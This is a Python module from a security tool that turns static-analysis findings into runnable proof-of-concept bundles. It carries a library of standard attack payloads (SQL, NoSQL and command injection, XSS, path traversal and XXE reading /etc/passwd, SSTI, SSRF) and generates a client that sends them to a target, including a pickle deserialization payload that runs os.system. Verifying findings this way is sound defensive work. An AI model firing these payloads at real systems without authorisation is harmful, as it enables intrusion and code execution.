"""T-4.2: evidence + PoC bundler.

Per finding, writes ``<out>/<finding_key>/`` containing:

  * a runnable PoC -- ``poc.py`` (stdlib urllib client with explicit exit
    codes: 0 REPRODUCED, 1 REFUTED, 2 transport failure, 3 usage) and/or
    ``poc.http`` when the finding's taint chain shows an HTTP source;
  * ``capture.json`` when a sandbox capture (analysis.repro.sandbox) ran;
  * ``manifest.json`` -- SHA-256 of every input and output, timestamp,
    tool version, image digest, and ``verification_status``.

``verification_status`` lives on the EXISTING
``core.evidence_schema.Evidence`` (extended with a VerificationStatus
field), never a parallel schema: ``evidence_for_bundle()`` returns the
canonical Evidence row for a bundle.

Honesty rules baked in:

  * status is derived, never asserted: capture blocked -> BLOCKED,
    expectation met -> REPRODUCED, expectation missed -> REFUTED,
    captured without expectation -> INCONCLUSIVE, no capture -> UNTESTED;
  * a PoC for a family we do not model is NOT generated -- the coverage
    report counts the finding as uncovered with a machine-readable
    reason, so the 40% gate measures reality;
  * refutation rate = REFUTED / (REPRODUCED + REFUTED); with zero judged
    captures it publishes ``null`` and ``tested: 0``, never a fake 0.0.
"""
from __future__ import annotations

import argparse
import ast
import hashlib
import json
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

# ---------------------------------------------------------------------------
# payload library (family-honest, static strings; no execution here)
# ---------------------------------------------------------------------------
POC_GATE_THRESHOLD = 0.40
REPORT_SCHEMA = "rsecopsx.poc_coverage/v1"
BUNDLE_SCHEMA = "rsecopsx.poc_bundle/v1"

#: vuln_type/rule fragment -> (payload, short rationale).  Only families we
#: can state a concrete attack input for are listed; everything else is
#: honestly uncovered (see status_reason NOT_MODELLED).
_PAYLOADS = {
    "sql_injection": ("' OR '1'='1' -- ", "SQL tautology breaks out of a quoted literal"),
    "nosql_injection": ('{"$gt": ""}', "MongoDB operator injection"),
    "command_injection": ("; id", "command separator runs a benign identity probe"),
    "shell": ("; id", "command separator runs a benign identity probe"),
    "code_injection": ("__import__('print')", "code evaluation probe"),
    "xss": ('"><script>alert("rsx")</script>', "reflected markup breakout"),
    "path_traversal": ("../../etc/passwd", "traversal to a world-readable path"),
    "multipart_traversal": ("../../etc/passwd",
                            "traversal filename inside a multipart part"),
    "xxe": ('<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
            "external entity resolves a local file"),
    "ssti": ("{{7*7}}", "template expression evaluates arithmetic"),
    "open_redirect": ("//example.invalid", "protocol-relative redirect target"),
    "ssrf": ("http://127.0.0.1:9", "loopback target for server-side fetch"),
    "idor": ("../../1", "object reference shift"),
    "template_injection": ("{{7*7}}",
                           "template expression evaluates arithmetic"),
    "debug_exposure": ("__debugger__=yes",
                       "Werkzeug debugger probe parameter"),
    # The deserialization payload is bytes, not a string: poc.py builds it
    # in-process (see the SERIALIZED branch of the template).
    "insecure_deserialization": ("PICKLE_BYTES_BUILT_IN",
                                 "python pickle __reduce__ executes a benign "
                                 "marker on load"),
}

#: HTTP source markers that mean an .http/poc.py client is meaningful.
_HTTP_SOURCES = (
    "request.args", "request.form", "request.post", "request.json",
    "request.data", "request.values", "request.get_json", "request.files",
    "request.headers", "request.cookies", "route parameter",
    # PHP superglobals are request-scope by definition.
    "$_GET", "$_POST", "$_REQUEST", "$_COOKIE", "$_SERVER",
)

_NOT_MODELLED = "NOT_MODELLED: no attack payload is modelled for this family"

_TOOL_VERSION = None  # resolved lazily: core.config may be absent in tests


def _tool_version() -> str:
    global _TOOL_VERSION
    if _TOOL_VERSION is None:
        try:
            from core.config import TOOL_VERSION
            _TOOL_VERSION = TOOL_VERSION
        except Exception:
            _TOOL_VERSION = ""
    return _TOOL_VERSION


def _sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _sha256_file(path: Path) -> str:
    return _sha256_bytes(path.read_bytes())


def _utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _finding_key(finding: dict) -> str:
    """Stable directory name: file stem + rule + line (group_key-like)."""
    import re
    file_part = Path(str(finding.get("file") or "unknown")).stem
    rule = str(finding.get("rule_id") or finding.get("vuln_type") or "rule")
    line = int(finding.get("line") or 0)
    safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", f"{file_part}__{rule}__L{line}")
    return safe[:120] or "finding"


def _payload_for(finding: dict) -> Optional[tuple[str, str]]:
    vt = str(finding.get("vuln_type") or "").lower()
    rid = str(finding.get("rule_id") or "").lower()
    for key, pair in _PAYLOADS.items():
        if key in vt or key in rid:
            return pair
    return None


def _chain_text(finding: dict) -> str:
    chain = finding.get("taint_chain") or finding.get("chain") or []
    if isinstance(chain, str):
        return chain
    return " | ".join(str(e) for e in chain)


#: Families whose transport IS HTTP even when the chain starts past the
#: source (multipart filename arrives in a form; a debug console is served).
_HTTP_FAMILIES = frozenset({"multipart_traversal", "debug_exposure"})


def _is_http_reachable(finding: dict) -> bool:
    if str(finding.get("vuln_type") or "").lower() in _HTTP_FAMILIES:
        return True
    text = _chain_text(finding) + " " + str(finding.get("source_expr") or "")
    return any(marker in text for marker in _HTTP_SOURCES)


def _param_for(finding: dict) -> str:
    for elem in reversed(list(_chain_text(finding).split("|"))):
        elem = elem.strip()
        if elem and not elem.startswith("__param__") and "." not in elem:
            return elem
    return str(finding.get("source_var") or "input")


def _model(finding: dict) -> Optional[dict]:
    """PoC model for a finding, or None when honestly not modelled."""
    hit = _payload_for(finding)
    if hit is None:
        return None
    payload, rationale = hit
    language = str(finding.get("language") or "python").lower()
    vt = str(finding.get("vuln_type") or "").lower()
    if "insecure_deserialization" in vt and language not in (
            "python", "javascript"):
        # Only a pickle-shaped builder exists here; a Java/ObjectInputStream
        # finding would need a gadget chain (ysoserial) we will not fake.
        return None
    return {
        "payload": payload,
        "rationale": rationale,
        "param": _param_for(finding),
        "http": _is_http_reachable(finding),
        "language": language,
        "family": ("insecure_deserialization"
                   if "insecure_deserialization" in vt else
                   "multipart" if "multipart" in vt else ""),
    }


# ---------------------------------------------------------------------------
# PoC artifacts
# ---------------------------------------------------------------------------
_POC_PY_TEMPLATE = '''#!/usr/bin/env python3
"""Runnable PoC for {rule} -- {file}:{line}

{rationale}

Usage:
  python poc.py --base-url http://127.0.0.1:8080 [--path /endpoint]
                [--param {param}] [--method POST]
                [--expect-status N] [--expect-body SUBSTRING]

Exit codes (the verification vocabulary, decided here and nowhere else):
  0  REPRODUCED      an expectation was given and every one matched
  1  REFUTED         an expectation was given and at least one missed
  2  BLOCKED         transport failure (target not up / unreachable)
  3  usage error

Without --base-url, RSX_REPRO_BASE_URL is used. Standard library only.
"""
import argparse
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

PAYLOAD = {payload!r}
PARAM = {param!r}
DEFAULT_PATH = {path!r}
METHOD = {method!r}
CONTENT = {content!r}   # form | query | multipart | pickle


def build_body(content, param, payload):
    """(data, content_type, query) -- one body shape per family.

    This block sits inside the format() template above, so it deliberately
    uses no backslash escapes and no single braces: what you read here is
    byte-for-byte what lands in the generated poc.py.
    """
    if content == "query":
        return (None, None, urllib.parse.urlencode({{param: payload}}))
    if content == "pickle":
        import pickle

        class _Marker:
            def __reduce__(self):
                # Benign side effect: the probe must never damage the host.
                return (os.system, ("echo rsx_pickle_pwned",))

        raw = pickle.dumps(_Marker(), protocol=0)  # ascii, one line
        return (raw, "application/octet-stream", None)
    if content == "multipart":
        boundary = "rsxboundary7a1c"
        crlf = chr(13) + chr(10)
        part = (
            "--" + boundary + crlf +
            'Content-Disposition: form-data; name="' + param + '"' + crlf +
            crlf + payload + crlf +
            "--" + boundary + "--" + crlf
        ).encode()
        return (part, "multipart/form-data; boundary=" + boundary, None)
    data = urllib.parse.urlencode({{param: payload}}).encode()
    return (data, "application/x-www-form-urlencoded", None)


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--base-url", default=os.environ.get(
        "RSX_REPRO_BASE_URL", ""))
    ap.add_argument("--path", default=DEFAULT_PATH)
    ap.add_argument("--param", default=PARAM)
    ap.add_argument("--method", default=METHOD)
    ap.add_argument("--expect-status", type=int, default=None)
    ap.add_argument("--expect-body", default=None)
    args = ap.parse_args(argv)
    if not args.base_url:
        print("error: --base-url or RSX_REPRO_BASE_URL required", file=sys.stderr)
        return 3
    parts = urllib.parse.urlsplit(args.base_url)
    if not parts.scheme or not parts.netloc:
        print(f"error: bad base url {{args.base_url!r}}", file=sys.stderr)
        return 3

    # Payload rides on the parameter the taint chain names, in the body
    # shape the family actually parses (form/query/multipart/pickle).
    data, ctype, query = build_body(CONTENT, args.param, PAYLOAD)
    url = args.base_url.rstrip("/") + "/" + args.path.lstrip("/")
    if query:
        sep = "&" if "?" in url else "?"
        url = url + sep + query
    headers = {{}}
    if ctype:
        headers["Content-Type"] = ctype
    req = urllib.request.Request(url, data=data, method=args.method.upper(),
                                 headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            status, body = resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        status, body = exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:
        print(f"blocked: {{exc}}", file=sys.stderr)
        return 2

    print(f"status={{status}}")
    print(body[:4096])
    checks = []
    if args.expect_status is not None:
        checks.append(("status", status == args.expect_status))
    if args.expect_body is not None:
        checks.append(("body", args.expect_body in body))
    if not checks:
        print("INCONCLUSIVE: captured, no expectation given")
        return 0
    for name, ok in checks:
        print(f"{{'PASS' if ok else 'FAIL'}} {{name}}")
    return 0 if all(ok for _, ok in checks) else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
'''

_POC_HTTP_TEMPLATE = '''### Runnable PoC for {rule} -- {file}:{line}
### {rationale}
### Replace {{{{base_url}}}} (or set RSX_REPRO_BASE_URL in an HTTP client
### that supports variable substitution); .http is the VS Code REST format.

@base_url = http://127.0.0.1:8080

{method} {{{{base_url}}}}{path}
Content-Type: application/x-www-form-urlencoded

{param}={payload_encoded}

### python-client artifacts (poc.py) carry family-specific bodies:
### multipart/form-data for traversal, octet-stream pickle for
### deserialization; .http stays form-urlencoded for the rest.
'''


_QUERY_SOURCES = ("request.args", "$_GET", "route parameter")


def _method_and_content(finding: dict, model: dict) -> tuple[str, str]:
    """(HTTP method, body content kind) driven by the chain, not guesses."""
    chain = _chain_text(finding)
    if model["family"] == "insecure_deserialization":
        return "POST", "pickle"
    if model["family"] == "multipart":
        return "POST", "multipart"
    if any(s in chain for s in _QUERY_SOURCES):
        return "GET", "query"
    return "POST", "form"


def generate_poc(finding: dict) -> list[tuple[str, str]]:
    """Return [(filename, content)] runnable PoC artifacts (may be empty)."""
    model = _model(finding)
    if model is None:
        return []
    file_hint = str(finding.get("file") or "unknown")
    line = int(finding.get("line") or 0)
    rule = str(finding.get("rule_id") or finding.get("vuln_type") or "rule")
    method, content = _method_and_content(finding, model)
    out: list[tuple[str, str]] = []
    # Every modelled family gets the client PoC: the target's language is
    # irrelevant because the PoC drives the deployed service, and whether
    # that channel really exists is what BLOCKED/INCONCLUSIVE/REFUTED
    # judge at capture time -- not something to guess at generation.
    out.append(("poc.py", _POC_PY_TEMPLATE.format(
        rule=rule, file=file_hint, line=line,
        rationale=model["rationale"], payload=model["payload"],
        param=model["param"], path="/", method=method,
        content=content)))
    if model["http"]:
        from urllib.parse import quote_plus
        out.append(("poc.http", _POC_HTTP_TEMPLATE.format(
            rule=rule, file=file_hint, line=line,
            rationale=model["rationale"],
            method=method, path="/",
            param=model["param"],
            payload_encoded=quote_plus(model["payload"]))))
    return out


def poc_is_runnable(name: str, content: str) -> tuple[bool, str]:
    """Static well-formedness: .py must parse; .http/.sh must be non-empty."""
    if not content.strip():
        return False, "empty artifact"
    if name.endswith(".py"):
        try:
            ast.parse(content)
        except SyntaxError as exc:
            return False, f"syntax error: {exc}"
        return True, "parses"
    return True, "non-empty"


# ---------------------------------------------------------------------------
# status + bundle
# ---------------------------------------------------------------------------
def determine_status(capture: Optional[dict], expect: Optional[dict]
                     ) -> tuple[str, str]:
    """(verification_status, reason) -- derived, never asserted."""
    if capture is None:
        return "UNTESTED", "no capture recorded"
    if capture.get("blocked_reason"):
        return "BLOCKED", str(capture["blocked_reason"])
    if not capture.get("payload_applied"):
        errs = "; ".join(map(str, capture.get("errors") or [])) or \
            "payload never applied"
        return "BLOCKED", errs
    response = capture.get("response") or {}
    if not expect:
        return "INCONCLUSIVE", (
            "payload captured (status %s) but no expectation was stated"
            % response.get("status"))
    status_ok = True
    if "status" in expect:
        status_ok = int(response.get("status") or -1) == int(expect["status"])
    body_ok = True
    if "body_contains" in expect:
        body_ok = str(expect["body_contains"]) in str(
            response.get("body") or "")
    if status_ok and body_ok:
        return "REPRODUCED", "capture met the stated expectation"
    return "REFUTED", "capture ran but the stated expectation failed"


def bundle_finding(finding: dict, out_root: Path,
                   capture: Optional[dict] = None,
                   expect: Optional[dict] = None) -> dict:
    """Write one bundle; returns the manifest (also written to disk)."""
    key = _finding_key(finding)
    bdir = out_root / key
    bdir.mkdir(parents=True, exist_ok=True)

    input_sha = _sha256_bytes(json.dumps(
        finding, sort_keys=True, default=str).encode())

    artifacts = []
    for name, content in generate_poc(finding):
        path = bdir / name
        path.write_text(content, encoding="utf-8", newline="\n")
        ok, why = poc_is_runnable(name, content)
        artifacts.append({
            "name": name, "sha256": _sha256_file(path),
            "bytes": path.stat().st_size, "kind": "poc",
            "runnable": ok, "runnable_reason": why,
        })

    capture_sha = None
    if capture is not None:
        cpath = bdir / "capture.json"
        blob = json.dumps(capture, sort_keys=True, indent=1,
                          default=str).encode()
        cpath.write_bytes(blob)
        capture_sha = _sha256_bytes(blob)

    if artifacts:
        status, reason = determine_status(capture, expect)
    else:
        # A capture must not judge a family we did not model: without a
        # PoC there is no finding-specific expectation to meet or miss, so
        # the status stays UNTESTED with the machine-readable reason and
        # the capture is still written for the record.
        status, reason = "UNTESTED", _NOT_MODELLED

    manifest = {
        "schema": BUNDLE_SCHEMA,
        "finding": {
            "rule_id": finding.get("rule_id"),
            "vuln_type": finding.get("vuln_type"),
            "severity": finding.get("severity"),
            "file": finding.get("file"),
            "line": finding.get("line"),
            "group_key": finding.get("group_key"),
        },
        "input_sha256": input_sha,
        "artifacts": artifacts,
        "capture": ({"name": "capture.json", "sha256": capture_sha}
                    if capture_sha else None),
        "expectation": expect,
        "verification_status": status,
        "status_reason": reason,
        "timestamp": _utc_now(),
        "tool_version": _tool_version(),
        "image_digest": (capture or {}).get(
            "env_fingerprint", {}).get("image_digest") if capture else None,
        "payload_rationale": (_model(finding) or {}).get("rationale"),
    }
    mpath = bdir / "manifest.json"
    mpath.write_text(json.dumps(manifest, sort_keys=True, indent=1),
                     encoding="utf-8", newline="\n")
    manifest["manifest_sha256"] = _sha256_file(mpath)
    return manifest


def evidence_for_bundle(manifest: dict, capture: Optional[dict] = None):
    """Canonical Evidence row for a bundle -- extends core.evidence_schema
    instead of inventing a parallel record."""
    from core.evidence_schema import (
        Evidence,
        EvidenceConfidence,
        EvidenceProvenance,
        EvidenceSource,
        EvidenceType,
        VerificationStatus,
        utc_now_iso8601,
    )
    status = VerificationStatus(manifest.get("verification_status")
                                or "UNTESTED")
    finding = manifest.get("finding") or {}
    content = {
        "bundle": {
            "input_sha256": manifest.get("input_sha256"),
            "artifacts": manifest.get("artifacts"),
            "capture": manifest.get("capture"),
            "status_reason": manifest.get("status_reason"),
            "tool_version": manifest.get("tool_version"),
            "image_digest": manifest.get("image_digest"),
        },
        "finding": finding,
    }
    ts = str(manifest.get("timestamp") or utc_now_iso8601())
    return Evidence.create(
        source=EvidenceSource(engine="R-SecOpsX",
                              component="repro-bundler"),
        provenance=EvidenceProvenance(
            source="analysis.repro.bundler", observed_at=ts,
            engine="R-SecOpsX", component="repro-bundler",
            tool=manifest.get("tool_version") or None),
        evidence_type=EvidenceType.DYNAMIC,
        content_or_context=content,
        confidence=(EvidenceConfidence.HIGH if status.value == "REPRODUCED"
                    else EvidenceConfidence.MEDIUM),
        related_finding_id=str(finding.get("group_key") or "") or None,
        timestamp=ts,
        verification_status=status,
    )


# ---------------------------------------------------------------------------
# coverage / refutation report (the honesty metric)
# ---------------------------------------------------------------------------
def coverage_report(manifests: list[dict], out_root: Path) -> dict:
    pop = [m for m in manifests
           if str((m.get("finding") or {}).get("severity") or "").lower()
           in ("high", "critical")]
    with_poc = [m for m in pop
                if any(a.get("runnable") for a in (m.get("artifacts") or []))]
    by_status: dict[str, int] = {}
    for m in manifests:
        s = str(m.get("verification_status") or "UNTESTED")
        by_status[s] = by_status.get(s, 0) + 1
    refuted = by_status.get("REFUTED", 0)
    reproduced = by_status.get("REPRODUCED", 0)
    tested = refuted + reproduced
    pct = (len(with_poc) / len(pop)) if pop else 0.0
    report = {
        "schema": REPORT_SCHEMA,
        "generated_at": _utc_now(),
        "tool_version": _tool_version(),
        "gate": {
            "name": "high_critical_runnable_poc",
            "threshold": POC_GATE_THRESHOLD,
            "measured": round(pct, 4),
            "pass": pct >= POC_GATE_THRESHOLD,
        },
        "population": {
            "bundles": len(manifests),
            "high_critical": len(pop),
            "high_critical_with_runnable_poc": len(with_poc),
            "not_modelled": sum(
                1 for m in manifests
                if str(m.get("status_reason") or "").startswith("NOT_MODELLED")),
        },
        "by_status": dict(sorted(by_status.items())),
        "refutation_rate": {
            "refuted": refuted,
            "reproduced": reproduced,
            "tested": tested,
            # null, not 0.0: zero judged captures is not a zero rate.
            "rate": (round(refuted / tested, 4) if tested else None),
            "note": ("refuted / (reproduced + refuted); null until at "
                     "least one capture is judged"),
        },
    }
    out_root.mkdir(parents=True, exist_ok=True)
    (out_root / "coverage_report.json").write_text(
        json.dumps(report, sort_keys=True, indent=1),
        encoding="utf-8", newline="\n")
    return report


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def _load_findings(path: Path) -> list[dict]:
    data = json.loads(path.read_text(encoding="utf-8"))
    if isinstance(data, dict):
        for key in ("findings", "results"):
            if isinstance(data.get(key), list):
                return [f for f in data[key] if isinstance(f, dict)]
        # grouped report: {group: [findings]}
        rows: list[dict] = []
        for value in data.values():
            if isinstance(value, list):
                rows += [f for f in value if isinstance(f, dict)]
        return rows
    if isinstance(data, list):
        return [f for f in data if isinstance(f, dict)]
    raise ValueError(f"unrecognized findings shape in {path}")


def main(argv: Optional[list[str]] = None) -> int:
    ap = argparse.ArgumentParser(
        prog="python -m analysis.repro.bundler",
        description="T-4.2: bundle runnable PoCs + captures + manifests")
    ap.add_argument("--findings", required=True,
                    help="findings JSON (list or {findings: [...]})")
    ap.add_argument("--out", required=True, help="bundle output directory")
    ap.add_argument("--capture", default=None,
                    help="optional capture JSON applied to every finding "
                         "this run (per-finding routing is later work)")
    ap.add_argument("--expect-status", type=int, default=None)
    ap.add_argument("--expect-body", default=None)
    ap.add_argument("--json-out", default=None,
                    help="also write the coverage report here")
    args = ap.parse_args(argv)

    findings = _load_findings(Path(args.findings))
    capture = None
    if args.capture:
        from analysis.repro.sandbox import capture_from_dict
        capture = capture_from_dict(
            json.loads(Path(args.capture).read_text(encoding="utf-8")))
    expect = None
    if args.expect_status is not None or args.expect_body is not None:
        expect = {}
        if args.expect_status is not None:
            expect["status"] = args.expect_status
        if args.expect_body is not None:
            expect["body_contains"] = args.expect_body

    out_root = Path(args.out)
    manifests = []
    for finding in findings:
        manifests.append(bundle_finding(finding, out_root, capture, expect))
    report = coverage_report(manifests, out_root)
    if args.json_out:
        Path(args.json_out).write_text(
            json.dumps(report, sort_keys=True, indent=1),
            encoding="utf-8", newline="\n")
    gate = report["gate"]
    print(f"bundles: {len(manifests)}  "
          f"high/critical with runnable poc: "
          f"{report['population']['high_critical_with_runnable_poc']}/"
          f"{report['population']['high_critical']}  "
          f"gate: {'PASS' if gate['pass'] else 'FAIL'} "
          f"({gate['measured']:.1%} >= {gate['threshold']:.0%})")
    rr = report["refutation_rate"]
    print(f"refutation rate: {rr['rate']} "
          f"({rr['refuted']} refuted / {rr['tested']} judged)")
    return 0 if gate["pass"] else 1


if __name__ == "__main__":
    sys.exit(main())
